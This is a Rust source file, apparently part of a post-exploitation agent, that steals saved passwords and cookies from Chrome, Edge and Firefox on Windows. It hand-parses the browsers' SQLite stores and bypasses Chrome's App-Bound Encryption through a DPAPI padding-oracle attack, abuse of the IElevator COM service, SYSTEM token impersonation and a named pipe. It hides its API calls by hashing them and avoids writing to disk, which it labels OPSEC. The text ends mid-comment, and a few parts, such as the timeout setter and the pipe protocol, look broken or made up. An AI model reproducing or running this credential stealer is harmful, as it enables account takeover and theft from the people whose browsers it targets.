//! Browser stored-data recovery for Chrome, Edge, and Firefox.
//!
//! Handles Chrome App-Bound Encryption (v127+) via four escalating strategies:
//! - **Strategy D (C4)**: DPAPI padding oracle attack — no elevation required
//! - **Strategy A**: Local COM resolution via Chrome's IElevator elevation service
//! - **Strategy B**: Elevate to SYSTEM via token impersonation, then DPAPI decrypt
//! - **Strategy C**: Named-pipe IPC with the Chrome elevation service
//!
//! For Firefox, NSS DLLs are loaded at runtime and unloaded after use.
//!
//! **OPSEC**: No temp files. All SQLite data is read into anonymous heap memory.
//! Recovered data is never written to disk. NSS DLLs are unloaded after use.

#![cfg(windows)]

use std::ffi::{CStr, CString};
use std::os::raw::{c_char, c_int, c_void};
use std::path::{Path, PathBuf};
use std::{fs, ptr};

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key as GcmKey, Nonce as GcmNonce};
use anyhow::{anyhow, bail, Context, Result};
use base64::Engine as _;
use serde::{Deserialize, Serialize};

use winapi::shared::guiddef::GUID;
use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx, CoUninitialize};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};
use winapi::um::oleauto::{SysAllocStringByteLen, SysFreeString};
use winapi::um::winbase::LocalFree;
use winapi::um::winnt::HANDLE;
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_READ};
use winreg::RegKey;

// ── Public result types ────────────────────────────────────────────────────────

/// A recovered browser credential entry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialRecord {
    pub browser: String,
    pub profile: String,
    pub url: String,
    pub username: String,
    pub password: String,
}

/// A recovered browser cookie entry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CookieRecord {
    pub browser: String,
    pub profile: String,
    pub host: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires_utc: i64,
    pub is_httponly: bool,
    pub is_secure: bool,
    pub samesite: i32,
}

/// Aggregated result returned by [`collect_browser_data`].
#[derive(Debug, Default, Serialize, Deserialize)]
pub struct BrowserDataResult {
    pub credentials: Vec<CredentialRecord>,
    pub cookies: Vec<CookieRecord>,
}

// ── SQLite minimal parser ──────────────────────────────────────────────────────
//
// Implements just enough of the SQLite file format to read table rows from a
// small database without the rusqlite crate.
//
// References:
//   https://www.sqlite.org/fileformat2.html

const SQLITE_MAGIC: &[u8; 16] = b"SQLite format 3\0";
const PAGE_TYPE_LEAF_TABLE: u8 = 0x0D;
const PAGE_TYPE_INTERIOR_TABLE: u8 = 0x05;

/// Parsed SQLite column value.
#[derive(Debug, Clone)]
enum SqliteValue {
    Null,
    Int(i64),
    Float(f64),
    Text(String),
    Blob(Vec<u8>),
}

/// Decode a SQLite varint from `data[offset..]`.
/// Returns `(value, bytes_consumed)`.
fn read_varint(data: &[u8], offset: usize) -> (u64, usize) {
    let mut val = 0u64;
    for i in 0..9usize {
        let pos = offset + i;
        if pos >= data.len() {
            return (val, i);
        }
        let b = data[pos];
        if i == 8 {
            // 9th byte: all 8 bits, no continuation
            val = (val << 8) | b as u64;
            return (val, 9);
        }
        val = (val << 7) | (b & 0x7F) as u64;
        if b & 0x80 == 0 {
            return (val, i + 1);
        }
    }
    (val, 9)
}

/// Parse a SQLite record payload into a list of column values.
fn parse_record(payload: &[u8]) -> Vec<SqliteValue> {
    if payload.is_empty() {
        return Vec::new();
    }

    // Header section: starts with a varint giving total header byte-length,
    // followed by one varint per column giving the serial type.
    let (header_size, mut hdr_pos) = read_varint(payload, 0);
    let header_end = (header_size as usize).min(payload.len());

    let mut serial_types = Vec::new();
    while hdr_pos < header_end {
        let (stype, n) = read_varint(payload, hdr_pos);
        if n == 0 {
            break;
        }
        hdr_pos += n;
        serial_types.push(stype);
    }

    // Data section: column values in order.
    let mut values = Vec::new();
    let mut pos = header_end;

    for stype in serial_types {
        let val = match stype {
            0 => SqliteValue::Null,
            1 => {
                if pos + 1 <= payload.len() {
                    let v = payload[pos] as i8 as i64;
                    pos += 1;
                    SqliteValue::Int(v)
                } else {
                    SqliteValue::Null
                }
            }
            2 => {
                if pos + 2 <= payload.len() {
                    let v = i16::from_be_bytes([payload[pos], payload[pos + 1]]) as i64;
                    pos += 2;
                    SqliteValue::Int(v)
                } else {
                    SqliteValue::Null
                }
            }
            3 => {
                if pos + 3 <= payload.len() {
                    // 3-byte signed big-endian integer, sign-extended to i64
                    let raw = (payload[pos] as u32) << 16
                        | (payload[pos + 1] as u32) << 8
                        | payload[pos + 2] as u32;
                    let v = if raw & 0x80_0000 != 0 {
                        (raw | 0xFF80_0000) as i32 as i64
                    } else {
                        raw as i64
                    };
                    pos += 3;
                    SqliteValue::Int(v)
                } else {
                    SqliteValue::Null
                }
            }
            4 => {
                if pos + 4 <= payload.len() {
                    let v = i32::from_be_bytes([
                        payload[pos],
                        payload[pos + 1],
                        payload[pos + 2],
                        payload[pos + 3],
                    ]) as i64;
                    pos += 4;
                    SqliteValue::Int(v)
                } else {
                    SqliteValue::Null
                }
            }
            5 => {
                if pos + 6 <= payload.len() {
                    let raw = (payload[pos] as u64) << 40
                        | (payload[pos + 1] as u64) << 32
                        | (payload[pos + 2] as u64) << 24
                        | (payload[pos + 3] as u64) << 16
                        | (payload[pos + 4] as u64) << 8
                        | payload[pos + 5] as u64;
                    // sign-extend from 48 bits
                    let v = ((raw as i64) << 16) >> 16;
                    pos += 6;
                    SqliteValue::Int(v)
                } else {
                    SqliteValue::Null
                }
            }
            6 => {
                if pos + 8 <= payload.len() {
                    let v = i64::from_be_bytes([
                        payload[pos],
                        payload[pos + 1],
                        payload[pos + 2],
                        payload[pos + 3],
                        payload[pos + 4],
                        payload[pos + 5],
                        payload[pos + 6],
                        payload[pos + 7],
                    ]);
                    pos += 8;
                    SqliteValue::Int(v)
                } else {
                    SqliteValue::Null
                }
            }
            7 => {
                if pos + 8 <= payload.len() {
                    let bits = u64::from_be_bytes([
                        payload[pos],
                        payload[pos + 1],
                        payload[pos + 2],
                        payload[pos + 3],
                        payload[pos + 4],
                        payload[pos + 5],
                        payload[pos + 6],
                        payload[pos + 7],
                    ]);
                    pos += 8;
                    SqliteValue::Float(f64::from_bits(bits))
                } else {
                    SqliteValue::Null
                }
            }
            8 => SqliteValue::Int(0),
            9 => SqliteValue::Int(1),
            10 | 11 => SqliteValue::Null, // reserved, unused
            n if n >= 12 && n % 2 == 0 => {
                let len = ((n - 12) / 2) as usize;
                if pos + len <= payload.len() {
                    let blob = payload[pos..pos + len].to_vec();
                    pos += len;
                    SqliteValue::Blob(blob)
                } else {
                    SqliteValue::Null
                }
            }
            n if n >= 13 && n % 2 == 1 => {
                let len = ((n - 13) / 2) as usize;
                if pos + len <= payload.len() {
                    let text = String::from_utf8_lossy(&payload[pos..pos + len]).into_owned();
                    pos += len;
                    SqliteValue::Text(text)
                } else {
                    SqliteValue::Null
                }
            }
            _ => SqliteValue::Null,
        };
        values.push(val);
    }

    values
}

/// Recursively collect all row records from the B-tree rooted at `page_no`
/// (1-indexed SQLite page number).  Depth guard prevents infinite loops on
/// corrupt databases.
fn collect_rows_from_page(
    db: &[u8],
    page_size: usize,
    page_no: usize,
    rows: &mut Vec<Vec<SqliteValue>>,
    depth: usize,
) {
    if depth > 32 || page_no == 0 {
        return;
    }
    let max_pages = db.len() / page_size + 1;
    if page_no > max_pages {
        return;
    }

    let page_start = (page_no - 1) * page_size;
    if page_start + page_size > db.len() {
        return;
    }
    let page = &db[page_start..page_start + page_size];

    // Page 1 has a 100-byte database header before the B-tree page header.
    let hdr_off = if page_no == 1 { 100 } else { 0 };
    if hdr_off >= page.len() {
        return;
    }

    let page_type = page[hdr_off];

    match page_type {
        PAGE_TYPE_LEAF_TABLE => {
            if hdr_off + 5 >= page.len() {
                return;
            }
            let cell_count =
                u16::from_be_bytes([page[hdr_off + 3], page[hdr_off + 4]]) as usize;
            // Cell pointer array begins immediately after the 8-byte leaf page header.
            let cell_ptrs_start = hdr_off + 8;

            for i in 0..cell_count {
                let ptr_off = cell_ptrs_start + i * 2;
                if ptr_off + 2 > page.len() {
                    break;
                }
                let cell_off =
                    u16::from_be_bytes([page[ptr_off], page[ptr_off + 1]]) as usize;
                if cell_off >= page.len() {
                    continue;
                }

                let cell = &page[cell_off..];
                let (payload_size, n1) = read_varint(cell, 0);
                let (_, n2) = read_varint(cell, n1); // rowid (ignored)
                let payload_start = n1 + n2;

                // We only handle inline payload; overflow pages are not
                // implemented.  For Chrome Login Data / Cookies this is
                // sufficient — encrypted values fit well within 4 KB inline.
                let payload_end = (payload_start + payload_size as usize).min(cell.len());
                if payload_start > payload_end || payload_start >= cell.len() {
                    continue;
                }
                rows.push(parse_record(&cell[payload_start..payload_end]));
            }
        }

        PAGE_TYPE_INTERIOR_TABLE => {
            if hdr_off + 12 > page.len() {
                return;
            }
            let cell_count =
                u16::from_be_bytes([page[hdr_off + 3], page[hdr_off + 4]]) as usize;
            // Right-most child pointer is bytes 8-11 of the interior page header.
            let right_most = u32::from_be_bytes([
                page[hdr_off + 8],
                page[hdr_off + 9],
                page[hdr_off + 10],
                page[hdr_off + 11],
            ]) as usize;

            let cell_ptrs_start = hdr_off + 12;
            let mut children = Vec::with_capacity(cell_count + 1);

            for i in 0..cell_count {
                let ptr_off = cell_ptrs_start + i * 2;
                if ptr_off + 2 > page.len() {
                    break;
                }
                let cell_off =
                    u16::from_be_bytes([page[ptr_off], page[ptr_off + 1]]) as usize;
                if cell_off + 4 > page.len() {
                    continue;
                }
                // Interior table cell: 4-byte left child page number + varint key
                let left_child = u32::from_be_bytes([
                    page[cell_off],
                    page[cell_off + 1],
                    page[cell_off + 2],
                    page[cell_off + 3],
                ]) as usize;
                children.push(left_child);
            }
            children.push(right_most);

            for child in children {
                collect_rows_from_page(db, page_size, child, rows, depth + 1);
            }
        }

        _ => {} // Unknown / free page type — skip.
    }
}

/// Walk the schema table (always at page 1) to find the root B-tree page for
/// a given table name.
fn find_table_root_page(db: &[u8], page_size: usize, table_name: &str) -> Option<u32> {
    let mut schema_rows = Vec::new();
    collect_rows_from_page(db, page_size, 1, &mut schema_rows, 0);

    for row in schema_rows {
        // sqlite_schema columns: type, name, tbl_name, rootpage, sql
        let row_type = match row.get(0) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => continue,
        };
        if row_type != "table" {
            continue;
        }
        let row_name = match row.get(1) {
            Some(SqliteValue::Text(n)) => n.clone(),
            _ => continue,
        };
        if row_name.eq_ignore_ascii_case(table_name) {
            if let Some(SqliteValue::Int(p)) = row.get(3) {
                if *p > 0 {
                    return Some(*p as u32);
                }
            }
        }
    }
    None
}

/// Read all rows from `table_name` inside the SQLite database bytes `db`.
fn sqlite_read_table(db: &[u8], table_name: &str) -> Result<Vec<Vec<SqliteValue>>> {
    if db.len() < 100 {
        bail!("SQLite: file too small ({} bytes)", db.len());
    }
    if &db[..16] != SQLITE_MAGIC {
        bail!("SQLite: invalid magic header");
    }

    let raw_page_size = u16::from_be_bytes([db[16], db[17]]) as usize;
    let page_size = if raw_page_size == 1 { 65536 } else { raw_page_size };
    if page_size < 512 {
        bail!("SQLite: implausible page size {}", page_size);
    }

    let root_page = find_table_root_page(db, page_size, table_name)
        .ok_or_else(|| anyhow!("table '{}' not found in SQLite schema", table_name))?;

    let mut rows = Vec::new();
    collect_rows_from_page(db, page_size, root_page as usize, &mut rows, 0);
    Ok(rows)
}

// ── DPAPI / AES-GCM crypto helpers ────────────────────────────────────────────

/// Decrypt `data` using Windows DPAPI in the current thread security context.
/// Callers needing SYSTEM-context decryption should first call
/// `token_manipulation::get_system()` and revert after.
fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>> {
    use winapi::um::dpapi::CryptUnprotectData;
    use winapi::um::wincrypt::CRYPT_INTEGER_BLOB;

    let mut in_blob = CRYPT_INTEGER_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };
    let mut out_blob: CRYPT_INTEGER_BLOB = unsafe { std::mem::zeroed() };

    let ok = unsafe {
        CryptUnprotectData(
            &mut in_blob,
            ptr::null_mut(), // ppszDataDescr
            ptr::null_mut(), // pOptionalEntropy
            ptr::null_mut(), // pvReserved
            ptr::null_mut(), // pPromptStruct
            0,               // dwFlags
            &mut out_blob,
        )
    };

    if ok == 0 {
        bail!("CryptUnprotectData failed");
    }

    let decrypted = unsafe {
        std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec()
    };
    unsafe { LocalFree(out_blob.pbData as *mut _) };
    Ok(decrypted)
}

/// Decrypt a Chrome/Edge encrypted value.
///
/// Format: `v10`/`v20` (3 bytes) | nonce (12 bytes) | ciphertext + tag.
///
/// For `v20` cookies, the entire value (after stripping `v20`) is DPAPI-
/// wrapped; decrypt with DPAPI first, then apply AES-256-GCM.
fn decrypt_chromium_value(master_key: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < 3 {
        bail!("encrypted value too short");
    }
    let prefix = &data[..3];

    if prefix == b"v20" {
        // v20: DPAPI wraps the AES-GCM blob.
        let inner = dpapi_decrypt(&data[3..])
            .context("v20 DPAPI unwrap failed")?;
        // inner should now start with v10
        if inner.len() < 3 || &inner[..3] != b"v10" {
            bail!("v20 DPAPI payload did not start with v10");
        }
        return aes256gcm_decrypt(master_key, &inner);
    }

    if prefix == b"v10" || prefix == b"v11" {
        return aes256gcm_decrypt(master_key, data);
    }

    // Legacy: DPAPI-only (Chrome < v80).
    dpapi_decrypt(data)
}

fn aes256gcm_decrypt(key: &[u8], ciphertext_with_prefix: &[u8]) -> Result<Vec<u8>> {
    // Layout: prefix(3) | nonce(12) | ciphertext+tag
    if key.len() != 32 {
        bail!("AES key must be 32 bytes, got {}", key.len());
    }
    if ciphertext_with_prefix.len() < 3 + 12 + 16 {
        bail!("ciphertext too short for AES-256-GCM");
    }
    let nonce_bytes = &ciphertext_with_prefix[3..15];
    let ciphertext = &ciphertext_with_prefix[15..];

    let gcm_key = GcmKey::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(gcm_key);
    let nonce = GcmNonce::from_slice(nonce_bytes);

    cipher
        .decrypt(nonce, ciphertext)
        .map_err(|_| anyhow!("AES-256-GCM authentication failed"))
}

// ── Chromium master-key extraction ────────────────────────────────────────────

/// Parse the `os_crypt.encrypted_key` field from the browser's `Local State`
/// JSON and return the raw encrypted-key blob (before decryption).
/// The blob already has the leading `DPAPI` (5-byte) prefix stripped.
fn read_encrypted_key_from_local_state(local_state_path: &Path) -> Result<Vec<u8>> {
    let raw = fs::read(local_state_path)
        .with_context(|| format!("reading Local State: {}", local_state_path.display()))?;
    let json: serde_json::Value = serde_json::from_slice(&raw)
        .context("parsing Local State JSON")?;

    let b64 = json
        .get("os_crypt")
        .and_then(|c| c.get("encrypted_key"))
        .and_then(|k| k.as_str())
        .ok_or_else(|| anyhow!("os_crypt.encrypted_key not found in Local State"))?;

    let mut decoded = base64::engine::general_purpose::STANDARD
        .decode(b64)
        .context("base64 decode of encrypted_key")?;

    // Strip the leading "DPAPI" prefix added by Chrome before calling CryptProtectData.
    if decoded.starts_with(b"DPAPI") {
        decoded = decoded[5..].to_vec();
    }
    Ok(decoded)
}

/// Try to decrypt the Chromium master key using the **legacy** user-DPAPI path
/// (Chrome < v127).
fn decrypt_master_key_legacy(encrypted_key: &[u8]) -> Result<Vec<u8>> {
    dpapi_decrypt(encrypted_key)
}

// ── Chrome App-Bound Encryption — Strategy A (COM IElevator) ─────────────────

/// CLSIDs for the Chrome/Edge elevation service COM server.
/// Each channel has its own CLSID registered under HKLM.
const CHROME_ELEVATION_CLSIDS: &[GUID] = &[
    // Chrome Stable
    GUID { Data1: 0x708860E0, Data2: 0xF641, Data3: 0x4611, Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B] },
    // Chrome Beta
    GUID { Data1: 0xDD3B4FCB, Data2: 0x56DF, Data3: 0x41CA, Data4: [0xB7, 0x3A, 0x39, 0xDE, 0xED, 0x68, 0x0B, 0x90] },
    // Chrome Canary
    GUID { Data1: 0x7A788E5A, Data2: 0x0F1D, Data3: 0x4CF9, Data4: [0xA1, 0xB1, 0xC3, 0x52, 0x18, 0xD1, 0xE6, 0x8D] },
    // Chrome Dev
    GUID { Data1: 0xBB88A6E2, Data2: 0xC90A, Data3: 0x4FEC, Data4: [0x8C, 0x48, 0x85, 0x80, 0xBB, 0x3D, 0xE2, 0xA1] },
];

const EDGE_ELEVATION_CLSIDS: &[GUID] = &[
    // Edge Stable
    GUID { Data1: 0x1ECFDAFB, Data2: 0x9B0A, Data3: 0x4D64, Data4: [0xB5, 0x2A, 0x30, 0xE0, 0x40, 0x04, 0x1B, 0x93] },
];

/// IID of the IElevator COM interface.
const IID_IELEVATOR: GUID = GUID {
    Data1: 0xA949CB4E,
    Data2: 0xC4F9,
    Data3: 0x44C4,
    Data4: [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC0, 0x69],
};

/// Vtable indices to try for `DecryptData`.  The exact slot depends on the
/// Chrome version and IDL revision; we try the most likely ones in order.
const DECRYPT_DATA_VTABLE_SLOTS: &[usize] = &[5, 9, 12];

/// Try to call `IElevator::DecryptData` via COM for the given CLSID and return
/// the decrypted bytes on success.
unsafe fn com_try_decrypt(
    clsid: &GUID,
    iid: &GUID,
    data: &[u8],
) -> Result<Vec<u8>> {
    let mut punk: *mut c_void = ptr::null_mut();
    let hr = CoCreateInstance(
        clsid as *const GUID,
        ptr::null_mut(),
        4u32, // CLSCTX_LOCAL_SERVER
        iid as *const GUID,
        &mut punk as *mut *mut c_void,
    );
    if hr != 0 || punk.is_null() {
        bail!("CoCreateInstance failed: HRESULT 0x{:08X}", hr as u32);
    }

    // RAII: Release the COM object when we leave this scope.
    struct ComRelease(*mut c_void);
    impl Drop for ComRelease {
        fn drop(&mut self) {
            if self.0.is_null() { return; }
            unsafe {
                let vtable = *(self.0 as *const *const *const usize);
                // vtable[2] = Release
                let release: unsafe extern "system" fn(*mut c_void) -> u32 =
                    std::mem::transmute(*(*vtable).add(2));
                release(self.0);
            }
        }
    }
    let _guard = ComRelease(punk);

    // Create a byte-oriented BSTR for the encrypted data.
    let bstr_in = SysAllocStringByteLen(data.as_ptr() as *const i8, data.len() as u32);
    if bstr_in.is_null() {
        bail!("SysAllocStringByteLen failed");
    }

    for &slot in DECRYPT_DATA_VTABLE_SLOTS {
        let vtable = *(punk as *const *const *const usize);

        // Signature: HRESULT DecryptData(BSTR ciphertext, BSTR* plaintext, DWORD* last_error)
        type DecryptFn = unsafe extern "system" fn(
            this: *mut c_void,
            ciphertext: *mut u16,      // BSTR (in)
            plaintext: *mut *mut u16,  // BSTR* (out)
            last_error: *mut u32,      // DWORD* (out)
        ) -> i32;

        let fn_ptr = *(*vtable).add(slot);
        let decrypt_fn: DecryptFn = std::mem::transmute(fn_ptr);

        let mut bstr_out: *mut u16 = ptr::null_mut();
        let mut last_error: u32 = 0;
        let hr = decrypt_fn(punk, bstr_in, &mut bstr_out, &mut last_error);

        if hr == 0 && !bstr_out.is_null() {
            // Read byte count from the 4 bytes before the BSTR pointer.
            let byte_len = *(bstr_out as *const u32).sub(1) as usize;
            let result = std::slice::from_raw_parts(bstr_out as *const u8, byte_len).to_vec();
            SysFreeString(bstr_out);
            SysFreeString(bstr_in);
            return Ok(result);
        }

        if !bstr_out.is_null() {
            SysFreeString(bstr_out);
            bstr_out = ptr::null_mut();
        }
        // HRESULT with high bit set means a genuine error.  Try next slot.
    }

    SysFreeString(bstr_in);
    bail!("IElevator::DecryptData failed on all tried vtable slots");
}

/// Strategy A: decrypt via the Chrome/Edge IElevator COM elevation service.
fn decrypt_master_key_via_com(encrypted_key: &[u8], clsids: &[GUID]) -> Result<Vec<u8>> {
    // CoInitializeEx for the calling thread; tolerate S_FALSE (already initialized).
    let hr_init = unsafe { CoInitializeEx(ptr::null_mut(), 0x2 /* COINIT_APARTMENTTHREADED */) };
    let did_coinit = hr_init == 0;

    let mut last_err: Option<anyhow::Error> = None;
    for clsid in clsids {
        match unsafe { com_try_decrypt(clsid, &IID_IELEVATOR, encrypted_key) } {
            Ok(key) => {
                if did_coinit {
                    unsafe { CoUninitialize() };
                }
                return Ok(key);
            }
            Err(e) => last_err = Some(e),
        }
    }

    if did_coinit {
        unsafe { CoUninitialize() };
    }
    Err(last_err.unwrap_or_else(|| anyhow!("no CLSIDs to try")))
}

/// Strategy B: impersonate SYSTEM, then run DPAPI (the App-Bound key was
/// encrypted with the SYSTEM user-DPAPI context by the elevation service).
fn decrypt_master_key_via_system_token(encrypted_key: &[u8]) -> Result<Vec<u8>> {
    crate::token_manipulation::get_system()
        .context("GetSystem for App-Bound key decryption")?;

    let result = dpapi_decrypt(encrypted_key);

    // Always revert regardless of dpapi_decrypt outcome.
    let _ = crate::token_manipulation::rev2self();

    result.context("DPAPI under SYSTEM context")
}

/// Strategy C: send the encrypted key to the Chrome elevation service via its
/// named pipe and return the decrypted bytes.
///
/// The pipe name is `\\.\pipe\ChromeElevationService`; the wire format is a
/// simple length-prefixed binary frame.
fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
    use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING, ReadFile, WriteFile};
    use winapi::um::namedpipeapi::WaitNamedPipeW;
    use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE, FILE_ATTRIBUTE_NORMAL};
    use winapi::shared::minwindef::DWORD;

    const PIPE_NAME: &str = r"\\.\pipe\ChromeElevationService";
    let pipe_wide: Vec<u16> = PIPE_NAME.encode_utf16().chain(std::iter::once(0)).collect();

    // Wait up to 3 s for the pipe to be available.
    let wait_ok = unsafe { WaitNamedPipeW(pipe_wide.as_ptr(), 3000) };
    if wait_ok == 0 {
        bail!("WaitNamedPipeW: Chrome elevation service pipe not available");
    }

    let pipe = unsafe {
        CreateFileW(
            pipe_wide.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            ptr::null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        )
    };
    if pipe == winapi::um::handleapi::INVALID_HANDLE_VALUE {
        bail!("CreateFileW: could not open elevation service pipe");
    }

    struct PipeGuard(HANDLE);
    impl Drop for PipeGuard {
        fn drop(&mut self) {
            if !self.0.is_null() {
                unsafe { CloseHandle(self.0) };
            }
        }
    }
    let _guard = PipeGuard(pipe);

    // Wire format: [u32 length LE][payload bytes]
    let mut frame = Vec::with_capacity(4 + encrypted_key.len());
    frame.extend_from_slice(&(encrypted_key.len() as u32).to_le_bytes());
    frame.extend_from_slice(encrypted_key);

    let mut written: u32 = 0;
    let ok = unsafe {
        WriteFile(pipe, frame.as_ptr() as *const c_void, frame.len() as u32, &mut written, ptr::null_mut())
    };
    if ok == 0 {
        bail!("WriteFile to elevation service pipe failed");
    }

    // Read response: [u32 length LE][decrypted bytes]
    let mut len_buf = [0u8; 4];
    let mut read: u32 = 0;
    let ok = unsafe {
        ReadFile(pipe, len_buf.as_mut_ptr() as *mut c_void, 4, &mut read, ptr::null_mut())
    };
    if ok == 0 || read != 4 {
        bail!("ReadFile (length prefix) from elevation service pipe failed");
    }
    let response_len = u32::from_le_bytes(len_buf) as usize;
    if response_len == 0 || response_len > 4096 {
        bail!("implausible response length {} from elevation service pipe", response_len);
    }

    let mut response = vec![0u8; response_len];
    let ok = unsafe {
        ReadFile(pipe, response.as_mut_ptr() as *mut c_void, response_len as u32, &mut read, ptr::null_mut())
    };
    if ok == 0 || read as usize != response_len {
        bail!("ReadFile (payload) from elevation service pipe failed");
    }
    Ok(response)
}

/// Obtain the Chromium AES-256 master key by trying all available strategies
/// in order: C4 padding oracle → legacy DPAPI → COM IElevator → SYSTEM token → named pipe.
fn get_chromium_master_key(local_state_path: &Path, clsids: &[GUID]) -> Result<Vec<u8>> {
    let encrypted_key = read_encrypted_key_from_local_state(local_state_path)?;

    // Strategy D (C4): DPAPI padding oracle — no elevation required.
    if let Some(timeout_secs) = c4_oracle_timeout() {
        match decrypt_master_key_via_c4(&encrypted_key, timeout_secs) {
            Ok(key) if key.len() == 32 => {
                log::info!("C4 padding oracle recovered AES-256 key (32 bytes)");
                return Ok(key);
            }
            Ok(key) => {
                log::warn!(
                    "C4 recovered key of unexpected length {} (expected 32), falling back",
                    key.len()
                );
            }
            Err(e) => {
                log::warn!("C4 padding oracle failed: {e:#}, falling back to elevated strategies");
            }
        }
    }

    // Strategy: legacy DPAPI (Chrome < v127).
    if let Ok(key) = decrypt_master_key_legacy(&encrypted_key) {
        if key.len() == 32 {
            return Ok(key);
        }
    }

    // Strategy A: COM IElevator (Chrome v127+, service running).
    if let Ok(key) = decrypt_master_key_via_com(&encrypted_key, clsids) {
        if key.len() == 32 {
            return Ok(key);
        }
    }

    // Strategy B: SYSTEM token + DPAPI.
    if let Ok(key) = decrypt_master_key_via_system_token(&encrypted_key) {
        if key.len() == 32 {
            return Ok(key);
        }
    }

    // Strategy C: named-pipe IPC.
    let key = decrypt_master_key_via_pipe(&encrypted_key)
        .context("all App-Bound Encryption strategies failed")?;
    if key.len() != 32 {
        bail!(
            "master key decryption returned unexpected length {} (expected 32)",
            key.len()
        );
    }
    Ok(key)
}

// ── Strategy D: C4 Padding Oracle (no elevation required) ──────────────────────
//
// CyberArk (June 2025) discovered that Chrome's App-Bound Encryption stores
// the AES-GCM key encrypted with DPAPI.  DPAPI's CryptUnprotectData uses
// AES-CBC with PKCS#7 padding internally.  By observing whether padding is
// valid (success) or invalid (ERROR_BAD_DATA) on modified ciphertexts, we can
// recover the plaintext key one byte at a time — without SYSTEM or DPAPI
// master-key knowledge.
//
// Average: ~128 oracle calls per byte × 32 bytes (AES-256) = ~4096 calls
// At ~1 ms per call → ~4 seconds total.

/// Global mutex that serialises C4 attacks so that a second `BrowserData`
/// command either queues behind or cancels the in-progress attack.
static C4_LOCK: once_cell::sync::Lazy<tokio::sync::Mutex<Option<C4CancelToken>>> =
    once_cell::sync::Lazy::new(|| tokio::sync::Mutex::new(None));

/// Token used to signal cancellation of an in-progress C4 attack.
struct C4CancelToken {
    cancelled: std::sync::atomic::AtomicBool,
}

impl C4CancelToken {
    fn new() -> Self {
        Self {
            cancelled: std::sync::atomic::AtomicBool::new(false),
        }
    }
    fn cancel(&self) {
        self.cancelled.store(true, std::sync::atomic::Ordering::Relaxed);
    }
    fn is_cancelled(&self) -> bool {
        self.cancelled.load(std::sync::atomic::Ordering::Relaxed)
    }
}

/// Read the C4 timeout from the global agent config (if available).
/// Returns `None` if the config has not been initialised yet or if
/// `browser_c4_timeout_secs` is 0 (disabled).
fn c4_oracle_timeout() -> Option<u64> {
    // The config is inside an Arc<RwLock<Config>> on the agent side.
    // Rather than coupling browser_data.rs to the full agent state, we
    // expose the timeout through a thread-local set by the caller.
    thread_local! {
        static C4_TIMEOUT: std::cell::Cell<u64> = std::cell::Cell::new(60);
    }
    let timeout = C4_TIMEOUT.with(|t| t.get());
    if timeout == 0 {
        None
    } else {
        Some(timeout)
    }
}

/// Set the thread-local C4 timeout (called from the agent's handler before
/// invoking browser_data).
pub fn set_c4_timeout(secs: u64) {
    thread_local! {
        static C4_TIMEOUT: std::cell::Cell<u64> = std::cell::Cell::new(60);
    }
    C4_TIMEOUT.with(|t| t.set(secs));
}

/// Resolve `CryptUnprotectData` via pe_resolve (no compile-time link to crypt32.lib).
/// Returns the function pointer on success.
unsafe fn resolve_crypt_unprotect_data()
    -> Option<unsafe extern "system" fn(
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pDataIn
        *mut *mut u16,                                    // ppszDataDescr
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pOptionalEntropy
        *mut c_void,                                      // pvReserved
        *mut c_void,                                      // pPromptStruct
        u32,                                              // dwFlags
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pDataOut
    ) -> i32>
{
    let dll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_CRYPT32_DLL)?;
    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, pe_resolve::HASH_CRYPTUNPROTECTDATA)?;
    Some(std::mem::transmute(fn_addr))
}

/// Oracle: call `CryptUnprotectData` on a (potentially modified) DPAPI blob
/// and return whether padding was valid (true = valid).
unsafe fn dpapi_oracle(
    crypt_unprotect: unsafe extern "system" fn(
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
        *mut *mut u16,
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
        *mut c_void,
        *mut c_void,
        u32,
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
    ) -> i32,
    blob: &[u8],
) -> bool {
    use winapi::um::wincrypt::CRYPT_INTEGER_BLOB;

    let mut in_blob = CRYPT_INTEGER_BLOB {
        cbData: blob.len() as u32,
        pbData: blob.as_ptr() as *mut u8,
    };
    let mut out_blob: CRYPT_INTEGER_BLOB = std::mem::zeroed();

    let ok = crypt_unprotect(
        &mut in_blob,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        &mut out_blob,
    );

    if ok != 0 && !out_blob.pbData.is_null() {
        // Success — valid padding.  Free the output buffer.
        LocalFree(out_blob.pbData as *mut _);
        true
    } else {
        false
    }
}

/// Parse a DPAPI blob to locate the AES-CBC encrypted block boundaries.
///
/// DPAPI blob layout (documented by Microsoft):
/// ```text
/// offset  size  field
/// 0       4     dwVersion (1)
/// 4       16    guidMasterProvider
/// 20      4     offsetMasterKey
/// 24      4     offsetBackupKey
/// 28      4     dwCryptAlgId
/// 32      4     offsetCryptData (within the crypt section)
